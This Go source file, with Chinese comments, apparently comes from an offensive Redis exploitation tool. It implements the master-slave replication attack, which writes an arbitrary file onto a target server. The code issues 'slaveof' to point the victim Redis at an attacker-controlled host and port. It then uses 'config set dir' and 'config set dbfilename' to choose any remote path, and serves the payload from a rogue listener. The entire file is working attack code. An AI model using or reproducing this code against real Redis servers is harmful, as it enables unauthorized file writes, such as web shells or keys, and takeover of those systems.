package pkg

import (
	"fmt"
	"io"
	"os"
)

// var (
// 	Rpath string
// 	Rfile string
// 	Lfile string
// )

// RedisUpload 主从复制上传文件
func RedisUpload() {
	// 判断文件大小，发现个Redis  Bug 小于9个字节可能会把 Redis 给打崩
	fi, err := os.Stat(Lfile)
	if err != nil {
		Err(err)
		os.Exit(0)
	}

	if fi.Size() < 9 {
		Info(fmt.Sprintf("当前文件大小：%d 个字节，不能上传小于 9 个字节, 因为可能会把Redis打崩哦", fi.Size()))
		os.Exit(0)
	}

	// 上传文件
	f, err := os.Open(Lfile)
	if err != nil {
		Err(err)
		os.Exit(0)
	}

	payload, err = io.ReadAll(f)
	if err != nil {
		Err(err)
		os.Exit(0)
	}

	Info("正在上传文件")

	slave := fmt.Sprintf("slaveof %v %v", Lhost, Lport)
	Info(slave)
	Success(RedisCmd(slave))

	dir := fmt.Sprintf("config set dir %v", Rpath)
	Info(dir)
	Success(RedisCmd(dir))

	file := fmt.Sprintf("config set dbfilename %v", Rfile)
	Info(file)
	Success(RedisCmd(file))

	Listen()

	Success(fmt.Sprintf("文件上传成功：%v", Rfile))

	CloseSlave("upload")

}
